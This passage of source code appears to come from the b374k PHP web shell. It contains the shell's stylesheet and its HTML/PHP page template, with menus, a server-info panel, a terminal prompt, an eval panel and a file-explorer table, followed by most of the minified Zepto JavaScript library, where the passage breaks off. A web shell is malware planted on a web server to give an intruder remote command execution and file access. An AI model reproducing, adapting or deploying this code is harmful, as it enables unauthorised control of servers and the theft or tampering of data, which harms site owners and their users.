border:1px solid #dddddd;}textarea{
resize:vertical;
width:100%;
height:300px;
min-height:300px;
max-width:100%;
min-width:100%;}hr{
margin:8px 0;
border-bottom:1px dashed #dddddd;}video{
width:100%;
background:#222222;
border-radius:8px;}h1, h2{
background:#E7E7E7;
border-bottom: 1px solid #cccccc;
color:#000000;
border-radius:8px;
text-align:center;
cursor:pointer;
padding:8px;
margin-bottom:8px;}h1 a, h2 a{
color:#000000;}pre, #viewFilecontent{
word-break:break-all;
word-wrap:break-word;}pre{
white-space:pre-wrap;}#b374k{
cursor:pointer;}#header{
width:100%;
position:fixed;}#headerNav{
padding:10px 8px 6px 8px;
background:#333333;}#headerNav img{
margin:0 4px;}#headerNav a{
color:#efefef;}#menu{
background:#7C94A8;
height:33px;
border-bottom:3px solid #CCCFD1;}#menu .menuitem{
padding:7px 12px 6px 12px;
float:left;
height:30px;
background:#7C94A8;
color:#ffffff;
cursor:pointer;}#menu .menuitem:hover, #menu .menuitemSelected{
background:#768999;
color:#ffffff;}#menu .menuitemSelected{
background:#768999;}#basicInfo{
width:100%;
padding:8px;
border-bottom:1px dashed #dddddd;}#content{
background:#f0f0f0;
height:100%;
padding:66px 8px 8px 8px;}#content .menucontent{
background:#f0f0f0;
clear:both;
display:none;
padding:8px;
overflow-x:auto;
overflow-y:hidden;}#overlay{
position:fixed;
top:0px;
left:0px;
width:100%;
height:100%;
display:none;}#loading{
width:64px;
height:64px;
background:#7C94A8;
border-radius:32px 0 32px 0;
margin:auto;
vertical-align:middle;}#ulDragNDrop{
padding:32px 0;
text-align:center;
background:#7C94A8;
border-radius:8px;
color:#ebebeb;}#form{
display:none;}#devTitle{
background:#ebebeb;}.box{
min-width:50%;
border:1px solid #dddddd;
padding:8px 8px 0 8px;
border-radius:8px;
position:fixed;
background:#ebebeb;
opacity:1;
box-shadow:1px 1px 25px #150f0f;
opacity:0.98;}.boxtitle{
background:#dddddd;
border: 1px solid #cccccc;
color:#000000;
border-radius:8px;
text-align:center;
cursor:pointer;}.boxtitle a, .boxtitle a:hover{
color:#000000;}.boxcontent{
padding:2px 0 2px 0;}.boxresult{
padding:4px 10px 6px 10px;
border-top:1px solid #dddddd;
margin-top:4px;
text-align:center;}.boxtbl{
border:1px solid #dddddd;
border-radius:8px;
padding-bottom:8px;
background:#ebebeb;}.boxtbl td{
vertical-align:middle;
padding:8px 15px;
border-bottom:1px dashed #dddddd;}.boxtbl input, .boxtbl select, .boxtbl .button{
width:100%;}.boxlabel{
text-align: center;
border-bottom:1px solid #dddddd;
padding-bottom:8px;}.boxclose{
background:#222222;
border-radius:3px;
margin-right:8px;
margin-top:-3px;
padding:2px 8px;
cursor:pointer;
color:#ffffff;}.strong{
color:#7C94A8;
text-shadow:0px 0px 1px #C0DCF5;}.weak{
color:#666666;}.button{
min-width:120px;
width:120px;
margin:2px;
color:#ffffff;
background:#7C94A8;
border:none;
padding:8px;
border-radius:8px;
display:block;
text-align:center;
float:left;
cursor:pointer;}.button:hover, #ulDragNDrop:hover{
background:#768999;}.floatLeft{
float:left;}.floatRight{
float:right;}.colFit{
width:1px;
white-space:nowrap;}.colSpan{
width:100%;}.border{
border:1px solid #dddddd;
background:#ebebeb;
border-radius:8px;
padding:8px;}.borderbottom{
border-bottom:1px dashed #dddddd;}.borderright{
border-right:1px dashed #dddddd;}.borderleft{
border-left:1px dashed #dddddd;}.hr td{
border-bottom:1px dashed #dddddd;}.cBox, .cBoxAll{
width:10px;
height:10px;
border:1px solid #7C94A8;
border-radius:5px;
margin:auto;
float:left;
margin:3px 6px 2px 6px;
cursor:pointer;}.cBoxSelected{
background:#7C94A8;}.action, .actionfolder, .actiondot{
cursor:pointer;}.phpError{
padding:8px;
margin:8px 0;
text-align:center;}.dataView td, .dataView th, #viewFile td{
vertical-align:top;
border-bottom:1px dashed #dddddd;}.dataView tbody tr:hover{
background:#ebebeb;}.dataView th{
vertical-align:middle;
border-bottom:0;
background:#e0e0e0;}.dataView tfoot td{
vertical-align:middle;}.dataView .col-cbox{
text-align:center;
width:20px;}.dataView .col-size{
width:70px;}#xplTable tr>td:nth-child(3){
text-align:left;}#xplTable tr>td:nth-child(4),#xplTable tr>td:nth-child(5),#xplTable tr>td:nth-child(6){
text-align:center;}.dataView .col-owner{
width:140px;
min-width:140px;
text-align:center;}.dataView .col-perms{
width:80px;
text-align:center;}.dataView .col-modified{
width:150px;
text-align:center;}.sortable th{
cursor:pointer;}#xplTable td{
white-space:nowrap;}#viewFile td{
text-align:left;}#viewFilecontent{
padding:8px;
border:1px solid #dddddd;
border-radius:8px;}#terminalPrompt td{
padding:0;}#terminalInput{
background:none;
border:none;
padding:0;
width:100%;}#evalAdditional{
display:none;}.hl_default{
color:#517797;}.hl_keyword{
color:#00BB00;}.hl_string{
color:#000000;}.hl_html{
color:#CE5403;}.hl_comment{
color:#7F9F7F;}#navigation{position:fixed;left:-16px;top:46%;}#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}#totop:hover,#tobottom:hover{opacity:0.80;}#toggleBasicInfo{display:none;float:right;margin:0;}#basicInfoSplitter{display:none;}#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}#showinfo{float:right;display:none;}#logout{float:right;}</style>
</head>
<body>
<!--wrapper start-->
<div id='wrapper'>
<!--header start-->
<div id='header'>
<!--header info start-->
<div id='headerNav'>
<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span><a class='boxclose' id='logout' title='log out'>x</a>
<a class='boxclose' id='showinfo' title='show info'>v</a>
</div>
<!--header info end--><!--menu start-->
<div id='menu'>
<?php
foreach($GLOBALS['module_to_load'] as $k){
echo "<a class='menuitem' id='menu".$GLOBALS['module'][$k]['id']."' href='#!".$GLOBALS['module'][$k]['id']."'>".$GLOBALS['module'][$k]['title']."</a>";}?>
</div>
<!--menu end--></div>
<!--header end--><!--content start-->
<div id='content'>
<!--server info start-->
<div id='basicInfo'>
<div id='toggleBasicInfo'></div>
<?php
echo $error_html;
foreach(get_server_info() as $k=>$v){
echo "<div>".$v."</div>";}?>
</div>
<!--server info end--><?php
foreach($GLOBALS['module_to_load'] as $k){
$content = $GLOBALS['module'][$k]['content'];
echo "<div class='menucontent' id='".$GLOBALS['module'][$k]['id']."'>".$content."</div>";}?>
</div>
<!--content end--></div>
<!--wrapper end-->
<div id='navigation'>
<div id='totop'></div>
<div id='tobottom'></div>
</div>
<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
<form action='<?php echo get_self(); ?>' method='post' id='form' target='_blank'></form>
<!--script start-->
<script type='text/javascript'>
var targeturl = '<?php echo get_self(); ?>';
var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
var win = <?php echo (is_win())?'true':'false';?>;
var init_shell = true;
/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||"object"}function H(a){return G(a)=="function"}function I(a){return a!=null&&a==a.window}function J(a){return a!=null&&a.nodeType==a.DOCUMENT_NODE}function K(a){return G(a)=="object"}function L(a){return K(a)&&!I(a)&&Object.getPrototypeOf(a)==Object.prototype}function M(a){return a instanceof Array}function N(a){return typeof a.length=="number"}function O(a){return g.call(a,function(a){return a!=null})}function P(a){return a.length>0?c.fn.concat.apply([],a):a}function Q(a){return a.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function R(a){return a in j?j[a]:j[a]=new RegExp("(^|\\s)"+a+"(\\s|$)")}function S(a,b){return typeof b=="number"&&!k[Q(a)]?b+"px":b}function T(a){var b,c;return i[a]||(b=h.createElement(a),h.body.appendChild(b),c=getComputedStyle(b,"").getPropertyValue("display"),b.parentNode.removeChild(b),c=="none"&&(c="block"),i[a]=c),i[a]}function U(a){return"children"in a?f.call(a.children):c.map(a.childNodes,function(a){if(a.nodeType==1)return a})}function V(c,d,e){for(b in d)e&&(L(d[b])||M(d[b]))?(L(d[b])&&!L(c[b])&&(c[b]={}),M(d[b])&&!M(c[b])&&(c[b]=[]),V(c[b],d[b],e)):d[b]!==a&&(c[b]=d[b])}function W(a,b){return b==null?c(a):c(a).filter(b)}function X(a,b,c,d){return H(b)?b.call(a,c,d):b}function Y(a,b,c){c==null?a.removeAttribute(b):a.setAttribute(b,c)}function Z(b,c){var d=b.className,e=d&&d.baseVal!==a;if(c===a)return e?d.baseVal:d;e?d.baseVal=c:b.className=c}function $(a){var b;try{return a?a=="true"||(a=="false"?!1:a=="null"?null:!/^0/.test(a)&&!isNaN(b=Number(a))?b:/^[\[\{]/.test(a)?c.parseJSON(a):a):a}catch(d){return a}}function _(a,b){b(a);for(var c in a.childNodes)_(a.childNodes[c],b)}var a,b,c,d,e=[],f=e.slice,g=e.filter,h=window.document,i={},j={},k={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},l=/^\s*<(\w+|!)[^>]*>/,m=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,n=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,o=/^(?:body|html)$/i,p=/([A-Z])/g,q=["val","css","html","text","data","width","height","offset"],r=["after","prepend","before","append"],s=h.createElement("table"),t=h.createElement("tr"),u={tr:h.createElement("tbody"),tbody:s,thead:s,tfoot:s,td:t,th:t,"*":h.createElement("div")},v=/complete|loaded|interactive/,w=/^\.([\w-]+)$/,x=/^#([\w-]*)$/,y=/^[\w-]*$/,z={},A=z.toString,B={},C,D,E=h.createElement("div"),F={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"};return B.matches=function(a,b){if(!b||!a||a.nodeType!==1)return!1;var c=a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.matchesSelector;if(c)return c.call(a,b);var d,e=a.parentNode,f=!e;return f&&(e=E).appendChild(a),d=~B.qsa(e,b).indexOf(a),f&&E.removeChild(a),d},C=function(a){return a.replace(/-+(.)?/g,function(a,b){return b?b.toUpperCase():""})},D=function(a){return g.call(a,function(b,c){return a.indexOf(b)==c})},B.fragment=function(b,d,e){var g,i,j;return m.test(b)&&(g=c(h.createElement(RegExp.$1))),g||(b.replace&&(b=b.replace(n,"<$1></$2>")),d===a&&(d=l.test(b)&&RegExp.$1),d in u||(d="*"),j=u[d],j.innerHTML=""+b,g=c.each(f.call(j.childNodes),function(){j.removeChild(this)})),L(e)&&(i=c(g),c.each(e,function(a,b){q.indexOf(a)>-1?i[a](b):i.attr(a,b)})),g},B.Z=function(a,b){return a=a||[],a.__proto__=c.fn,a.selector=b||"",a},B.isZ=function(a){return a instanceof B.Z},B.init=function(b,d){var e;if(!b)return B.Z();if(typeof b=="string"){b=b.trim();if(b[0]=="<"&&l.test(b))e=B.fragment(b,RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}else{if(H(b))return c(h).ready(b);if(B.isZ(b))return b;if(M(b))e=O(b);else if(K(b))e=[b],b=null;else if(l.test(b))e=B.fragment(b.trim(),RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}return B.Z(e,b)},c=function(a,b){return B.init(a,b)},c.extend=function(a){var b,c=f.call(arguments,1);return typeof a=="boolean"&&(b=a,a=c.shift()),c.forEach(function(c){V(a,c,b)}),a},B.qsa=function(a,b){var c,d=b[0]=="#",e=!d&&b[0]==".",g=d||e?b.slice(1):b,h=y.test(g);return J(a)&&h&&d?(c=a.getElementById(g))?[c]:[]:a.nodeType!==1&&a.nodeType!==9?[]:f.call(h&&!d?e?a.getElementsByClassName(g):a.getElementsByTagName(b):a.querySelectorAll(b))},c.contains=function(a,b){return a!==b&&a.contains(b)},c.type=G,c.isFunction=H,c.isWindow=I,c.isArray=M,c.isPlainObject=L,c.isEmptyObject=function(a){var b;for(b in a)return!1;return!0},c.inArray=function(a,b,c){return e.indexOf.call(b,a,c)},c.camelCase=C,c.trim=function(a){return a==null?"":String.prototype.trim.call(a)},c.uuid=0,c.support={},c.expr={},c.map=function(a,b){var c,d=[],e,f;if(N(a))for(e=0;e<a.length;e++)c=b(a[e],e),c!=null&&d.push(c);else for(f in a)c=b(a[f],f),c!=null&&d.push(c);return P(d)},c.each=function(a,b){var c,d;if(N(a)){for(c=0;c<a.length;c++)if(b.call(a[c],c,a[c])===!1)return a}else for(d in a)if(b.call(a[d],d,a[d])===!1)return a;return a},c.grep=function(a,b){return g.call(a,b)},window.JSON&&(c.parseJSON=JSON.parse),c.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){z["[object "+b+"]"]=b.toLowerCase()}),c.fn={forEach:e.forEach,reduce:e.reduce,push:e.push,sort:e.sort,indexOf:e.indexOf,concat:e.concat,map:function(a){return c(c.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return c(f.apply(this,arguments))},ready:function(a){return v.test(h.readyState)&&h.body?a(c):h.addEventListener("DOMContentLoaded",function(){a(c)},!1),this},get:function(b){return b===a?f.call(this):this[b>=0?b:b+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each(function(){this.parentNode!=null&&this.parentNode.removeChild(this)})},each:function(a){return e.every.call(this,function(b,c){return a.call(b,c,b)!==!1}),this},filter:function(a){return H(a)?this.not(this.not(a)):c(g.call(this,function(b){return B.matches(b,a)}))},add:function(a,b){return c(D(this.concat(c(a,b))))},is:function(a){return this.length>0&&B.matches(this[0],a)},not:function(b){var d=[];if(H(b)&&b.call!==a)this.each(function(a){b.call(this,a)||d.push(this)});else{var e=typeof b=="string"?this.filter(b):N(b)&&H(b.item)?f.call(b):c(b);this.forEach(function(a){e.indexOf(a)<0&&d.push(a)})}return c(d)},has:function(a){return this.filter(function(){return K(a)?c.contains(this,a):c(this).find(a).size()})},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){var a=this[0];return a&&!K(a)?a:c(a)},last:function(){var a=this[this.length-1];return a&&!K(a)?a:c(a)},find:function(a){var b,d=this;return typeof a=="object"?b=c(a).filter(function(){var a=this;return e.some.call(d,function(b){return c.contains(b,a)})}):this.length==1?b=c(B.qsa(this[0],a)):b=this.map(function(){return B.qsa(this,a)}),b},closest:function(a,b){var d=this[0],e=!1;typeof a=="object"&&(e=c(a));while(d&&!(e?e.indexOf(d)>=0:B.matches(d,a)))d=d!==b&&!J(d)&&d.parentNode;return c(d)},parents:function(a){var b=[],d=this;while(d.length>0)d=c.map(d,function(a){if((a=a.parentNode)&&!J(a)&&b.indexOf(a)<0)return b.push(a),a});return W(b,a)},parent:function(a){return W(D(this.pluck("parentNode")),a)},children:function(a){return W(this.map(function(){return U(this)}),a)},contents:function(){return this.map(function(){return f.call(this.childNodes)})},siblings:function(a){return W(this.map(function(a,b){return g.call(U(b.parentNode),function(a){return a!==b})}),a)},empty:function(){return this.each(function(){this.innerHTML=""})},pluck:function(a){return c.map(this,function(b){return b[a]})},show:function(){return this.each(function(){this.style.display=="none"&&(this.style.display=""),getComputedStyle(this,"").getPropertyValue("display")=="none"&&(this.style.display=T(this.nodeName))})},replaceWith:function(a){return this.before(a).remove()},wrap:function(a){var b=H(a);if(this[0]&&!b)var d=c(a).get(0),e=d.parentNode||this.length>1;return this.each(function(f){c(this).wrapAll(b?a.call(this,f):e?d.cloneNode(!0):d)})},wrapAll:function(a){if(this[0]){c(this[0]).before(a=c(a));var b;while((b=a.children()).length)a=b.first();c(a).append(this)}return this},wrapInner:function(a){var b=H(a);return this.each(function(d){var e=c(this),f=e.contents(),g=b?a.call(this,d):a;f.length?f.wrapAll(g):e.append(g)})},unwrap:function(){return this.parent().each(function(){c(this).replaceWith(c(this).children())}),this},clone:function(){return this.map(function(){return this.cloneNode(!0)})},hide:function(){return this.css("display","none")},toggle:function(b){return this.each(function(){var d=c(this);(b===a?d.css("display")=="none":b)?d.show():d.hide()})},prev:function(a){return c(this.pluck("previousElementSibling")).filter(a||"*")},next:function(a){return c(this.pluck("nextElementSibling")).filter(a||"*")},html:function(a){return arguments.length===0?this.length>0?this[0].innerHTML:null:this.each(function(b){var d=this.innerHTML;c(this).empty().append(X(this,a,b,d))})},text:function(b){return arguments.length===0?this.length>0?this[0].textContent:null:this.each(function(){this.textContent=b===a?"":""+b})},attr:function(c,d){var e;return typeof c=="string"&&d===a?this.length==0||this[0].nodeType!==1?a:c=="value"&&this[0].nodeName=="INPUT"?this.val():!(e=this[0].getAttribute(c))&&c in this[0]?this[0][c]:e:this.each(function(a){if(this.nodeType!==1)return;if(K(c))for(b in c)Y(this,b,c[b]);else Y(this,c,X(this,d,a,this.getAttribute(c)))})},removeAttr:function(a){return this.each(function(){this.nodeType===1&&Y(this,a)})},prop:function(b,c){return b=F[b]||b,c===a?this[0]&&this[0][b]:this.each(function(a){this[b]=X(this,c,a,this[b])})},data:function(b,c){var d=this.attr("data-"+b.replace(p,"-$1").toLowerCase(),c);return d!==null?$(d):a},val:function(a){return arguments.length===0?this[0]&&(this[0].multiple?c(this[0]).find("option").filter(function(){return this.selected}).pluck("value"):this[0].value):this.each(function(b){this.value=X(this,a,b,this.value)})},offset:function(a){if(a)return this.each(function(b){var d=c(this),e=X(this,a,b,d.offset()),f=d.offsetParent().offset(),g={top:e.top-f.top,left:e.left-f.left};d.css("position")=="static"&&(g.position="relative"),d.css(g)});if(this.length==0)return null;var b=this[0].getBoundingClientRect();return{left:b.left+window.pageXOffset,top:b.top+window.pageYOffset,width:Math.round(b.width),height:Math.round(b.height)}},css:function(a,d){if(arguments.length<2){var e=this[0],f=getComputedStyle(e,"");if(!e)return;if(typeof a=="string")return e.style[C(a)]||f.getPropertyValue(a);if(M(a)){var g={};return c.each(M(a)?a:[a],function(a,b){g[b]=e.style[C(b)]||f.getPropertyValue(b)}),g}}var h="";if(G(a)=="string")!d&&d!==0?this.each(function(){this.style.removeProperty(Q(a))}):h=Q(a)+":"+S(a,d);else for(b in a)!a[b]&&a[b]!==0?this.each(function(){this.style.removeProperty(Q(b))}):h+=Q(b)+":"+S(b,a[b])+";";return this.each(function(){this.style.cssText+=";"+h})},index:function(a){return a?this.indexOf(c(a)[0]):this.parent().children().indexOf(this[0])},hasClass:function(a){return a?e.some.call(this,function(a){return this.test(Z(a))},R(a)):!1},addClass:function(a){return a?this.each(function(b){d=[];var e=Z(this),f=X(this,a,b,e);f.split(/\s+/g).forEach(function(a){c(this).hasClass(a)||d.push(a)},this),d.length&&Z(this,e+(e?" ":"")+d.join(" "))}):this},removeClass:function(b){return this.each(function(c){if(b===a)return Z(this,"");d=Z(this),X(this,b,c,d).split(/\s+/g).forEach(function(a){d=d.replace(R(a)," ")}),Z(this,d.trim())})},toggleClass:function(b,d){return b?this.each(function(e){var f=c(this),g=X(this,b,e,Z(this));g.split(/\s+/g).forEach(function(b){(d===a?!f.hasClass(b):d)?f.addClass(b):f.removeClass(b)})}):this},scrollTop:function(b){if(!this.length)return;var c="scrollTop"in this[0];return b===a?c?this[0].scrollTop:this[0].pageYOffset:this.each(c?function(){this.scrollTop=b}:function(){this.scrollTo(this.scrollX,b)})},scrollLeft:function(b){if(!this.length)return;var c="scrollLeft"in this[0];return b===a?c?this[0].scrollLeft:this[0].pageXOffset:this.each(c?function(){this.scrollLeft=b}:function(){this.scrollTo(b,this.scrollY)})},position:function(){if(!this.length)return;var a=this[0],b=this.offsetParent(),d=this.offset(),e=o.test(b[0].nodeName)?{top:0,left:0}:b.offset();return d.top-=parseFloat(c(a).css("margin-top"))||0,d.left-=parseFloat(c(a).css("margin-left"))||0,e.top+=parseFloat(c(b[0]).css("border-top-width"))||0,e.left+=parseFloat(c(b[0]).css("border-left-width"))||0,{top:d.top-e.top,left:d.left-e.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||h.body;while(a&&!o.test(a.nodeName)&&c(a).css("position")=="static")a=a.offsetParent;return a})}},c.fn.detach=c.fn.remove,["width","height"].forEach(function(b){var d=b.replace(/./,function(a){return a[0].toUpperCase()});c.fn[b]=function(e){var f,g=this[0];return e===a?I(g)?g["inner"+d]:J(g)?g.documentElement["scroll"+d]:(f=this.offset())&&f[b]:this.each(function(a){g=c(this),g.css(b,X(this,e,a,g[b]()))})}}),r.forEach(function(a,b){var d=b%2;c.fn[a]=function(){var a,e=c.map(arguments,function(b){return a=G(b),a=="object"||a=="array"||b==null?b:B.fragment(b)}),f,g=this.length>1;return e.length<1?this:this.each(function(a,h){f=d?h:h.parentNode,h=b==0?h.nextSibling:b==1?h.firstChild:b==2?h:null,e.forEach(function(a){if(g)a=a.cloneNode(!0);else if(!f)return c(a).remove();_(f.insertBefore(a,h),function(a){a.nodeName!=null&&a.nodeName.toUpperCase()==="SCRIPT"&&(!a.type||a.type==="text/javascript")&&!a.src&&window.eval.call(window,a.innerHTML)})})})},c.fn[d?a+"To":"insert"+(b?"Before":"After")]=function(b){return c(b)[a](this),this}}),B.Z.prototype=c.fn,B.uniq=D,B.deserializeValue=$,c.zepto=B,c}();window.Zepto=Zepto,window.$===undefined&&(window.$=Zepto),function(a){function m(a){return a._zid||(a._zid=c++)}function n(a,b,c,d){b=o(b);if(b.ns)var e=p(b.ns);return(h[m(a)]||[]).filter(function(a){return a&&(!b.e||a.e==b.e)&&(!b.ns||e.test(a.ns))&&(!c||m(a.fn)===m(c))&&(!d||a.sel==d)})}function o(a){var b=(""+a).split(".");return{e:b[0],ns:b.slice(1).sort().join(" ")}}function p(a){return new RegExp("(?:^| )"+a.replace(" "," .* ?")+"(?: |$)")}function q(a,b){return a.del&&!j&&a.e in k||!!b}function r(a){return l[a]||j&&k[a]||a}function s(b,c,e,f,g,i,j){var k=m(b),n=h[k]||(h[k]=[]);c.split(/\s/).forEach(function(c){if(c=="ready")return a(document).ready(e);var h=o(c);h.fn=e,h.sel=g,h.e in l&&(e=function(b){var c=b.relatedTarget;if(!c||c!==this&&!a.contains(this,c))return h.fn.apply(this,arguments)}),h.del=i;var k=i||e;h.proxy=function(a){a=y(a);if(a.isImmediatePropagationStopped())return;a.data=f;var c=k.apply(b,a._args==d?[a]:[a].concat(a._args));return c===!1&&(a.preventDefault(),a.stopPropagation()),c},h.i=n.length,n.push(h),"addEventListener"in b&&b.addEventListener(r(h.e),h.proxy,q(h,j))})}function t(a,b,c,d,e){var f=m(a);(b||"").split(/\s/).forEach(function(b){n(a,b,c,d).forEach(function(b){delete h[f][b.i],"removeEventListener"in a&&a.removeEventListener(r(b.e),b.proxy,q(b,e))})})}function y(b,c){if(c||!b.isDefaultPrevented){c||(c=b),a.each(x,function(a,d){var e=c[a];b[a]=function(){return this[d]=u,e&&e.apply(c,arguments)},b[d]=v});if(c.defaultPrevented!==d?c.defaultPrevented:"returnValue"in c?c.returnValue===!1:c.getPreventDefault&&c.getPreventDefault())b.isDefaultPrevented=u}return b}function z(a){var b,c={originalEvent:a};for(b in a)!w.test(b)&&a[b]!==d&&(c[b]=a[b]);return y(c,a)}var b=a.zepto.qsa,c=1,d,e=Array.prototype.slice,f=a.isFunction,g=function(a){return typeof a=="string"},h={},i={},j="onfocusin"in window,k={focus:"focusin",blur:"focusout"},l={mouseenter:"mouseover",mouseleave:"mouseout"};i.click=i.mousedown=i.mouseup=i.mousemove="MouseEvents",a.event={add:s,remove:t},a.proxy=function(b,c){if(f(b)){var d=function(){return b.apply(c,arguments)};return d._zid=m(b),d}if(g(c))return a.proxy(b[c],b);throw new TypeError("expected function")},a.fn.bind=function(a,b,c){return this.on(a,b,c)},a.fn.unbind=function(a,b){return this.off(a,b)},a.fn.one=function(a,b,c,d){return this.on(a,b,c,d,1)};var u=function(){return!0},v=function(){return!1},w=/^([A-Z]|returnValue$|layer[XY]$)/,x={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};a.fn.delegate=function(a,b,c){return this.on(b,a,c)},a.fn.undelegate=function(a,b,c){return this.off(b,a,c)},a.fn.live=function(b,c){return a(document.body).delegate(this.selector,b,c),this},a.fn.die=function(b,c){return a(document.body).undelegate(this.selector,b,c),this},a.fn.on=function(b,c,h,i,j){var k,l,m=this;if(b&&!g(b))return a.each(b,function(a,b){m.on(a,c,h,b,j)}),m;!g(c)&&!f(i)&&i!==!1&&(i=h,h=c,c=d);if(f(h)||h===!1)i=h,h=d;return i===!1&&(i=v),m.each(function(d,f){j&&(k=function(a){return t(f,a.type,i),i.apply(this,arguments)}),c&&(l=function(b){var d,g=a(b.target).closest(c,f).get(0);if(g&&g!==f)return d=a.extend(z(b),{currentTarget:g,liveFired:f}),(k||i).apply(g,[d].concat(e.call(arguments,1)))}),s(f,b,i,h,c,l||k)})},a.fn.off=function(b,c,e){var h=this;return b&&!g(b)?(a.each(b,function(a,b){h.off(a,c,b)}),h):(!g(c)&&!f(e)&&e!==!1&&(e=c,c=d),e===!1&&(e=v),h.each(function(){t(this,b,e,c)}))},a.fn.trigger=function(b,c){return b=g(b)||a.isPlainObject(b)?a.Event(b):y(b),b._args=c,this.each(function(){"dispatchEvent"in this?this.dispatchEvent(b):a(this).triggerHandler(b,c)})},a.fn.triggerHandler=function(b,c){var d,e;return this.each(function(f,h){d=z(g(b)?a.Event(b):b),d._args=c,d.target=h,a.each(n(h,b.type||b),function(a,b){e=b.proxy(d);if(d.isImmediatePropagationStopped())return!1})}),e},"focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.trigger(b)}}),["focus","blur"].forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.each(function(){try{this[b]()}catch(a){}}),this}}),a.Event=function(a,b){g(a)||(b=a,a=b.type);var c=document.createEvent(i[a]||"Events"),d=!0;if(b)for(var e in b)e=="bubbles"?d=!!b[e]:c[e]=b[e];return c.initEvent(a,d,!0),y(c)}}(Zepto),function($){function triggerAndReturn(a,b,c){var d=$.Event(b);return $(a).trigger(d,c),!d.isDefaultPrevented()}function triggerGlobal(a,b,c,d){if(a.global)return triggerAndReturn(b||document,c,d)}function ajaxStart(a){a.global&&$.active++===0&&triggerGlobal(a,null,"ajaxStart")}function ajaxStop(a){a.global&&!--$.active&&triggerGlobal(a,null,"ajaxStop")}function ajaxBeforeSend(a,b){var c=b.context;if(b.beforeSend.call(c,a,b)===!1||triggerGlobal(b,c,"ajaxBeforeSend",[a,b])===!1)return!1;triggerGlobal(b,c,"ajaxSend",[a,b])}function ajaxSuccess(a,b,c,d){var e=c.context,f="success";c.success.call(e,a,f,b),d&&d.resolveWith(e,[a,f,b]),triggerGlobal(c,e,"ajaxSuccess",[b,c,a]),ajaxComplete(f,b,c)}function ajaxError(a,b,c,d,e){var f=d.context;d.error.call(f,c,b,a),e&&e.rejectWith(f,[c,b,a]),triggerGlobal(d,f,"ajaxError",[c,d,a||b]),ajaxComplete(b,c,d)}function ajaxComplete(a,b,c){var d=c.context;c.complete.call(d,b,a),triggerGlobal(c,d,"ajaxComplete",[b,c]),ajaxStop(c)}function empty(){}function mimeToDataType(a){return a&&(a=a.split(";",2)[0]),a&&(a==htmlType?"html":a==jsonType?"json":scriptTypeRE.test(a)?"script":xmlTypeRE.test(a)&&"xml")||"text"}function appendQuery(a,b){return b==""?a:(a+"&"+b).replace(/[&?]{1,2}/,"?")}function serializeData(a){a.processData&&a.data&&$.type(a.data)!="string"&&(a.data=$.param(a.data,a.traditional)),a.data&&(!a.type||a.type.toUpperCase()=="GET")&&(a.url=appendQuery(a.url,a.data),a.data=undefined)}function parseArguments(a,b,c,d){var e=!$.isFunction(b);return{url:a,data:e?b:undefined,success:e?$.isFunction(c)?c:undefined:b,dataType:e?d||c:c}}function serialize(a,b,c,d){var e,f=$.isArray(b),g=$.isPlainObject(b);$.each(b,function(b,h){e=$.type(h),d&&(b=c?d:d+"["+(g||e=="object"||e=="array"?b:"")+"]"),!d&&f?a.add(h.name,h.value):e=="array"||!c&&e=="object"?serialize(a,h,c,b):a.add(b,h)})}var jsonpID=0,document=window.document,key,name,rscript=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,scriptTypeRE=/^(?:text|application)\/javascript/i,xmlTypeRE=/^(?:text|application)\/xml/i,jsonType="application/json",htmlType="text/html",blankRE=/^\s*$/;$.active=0,$.ajaxJSONP=function(a,b){if("type"in a){var c=a.jsonpCallback,d=($.isFunction(c)?c():c)||"jsonp"+ ++jsonpID,e=document.createElement("script"),f=window[d],g,h=function(a){$(e).triggerHandler("error",a||"abort")},i={abort:h},j;return b&&b.promise(i),$(e).on("load error",function(c,h){clearTimeout(j),$(e).off().remove(),c.type=="error"||!g?ajaxError(null,h||"error",i,a,b):ajaxSuccess(g[0],i,a,b),window[d]=f,g&&$.isFunction(f)&&f(g[0]),f=g=undefined}),ajaxBeforeSend(i,a)===!1?(h("abort"),i):(window[d]=function(){g=arguments},e.src=a.url.replace(/=\?/,"="+d),document.head.appendChild(e),a.timeout>0&&(j=setTimeout(function(){h("timeout")},a.timeout)),i)}return 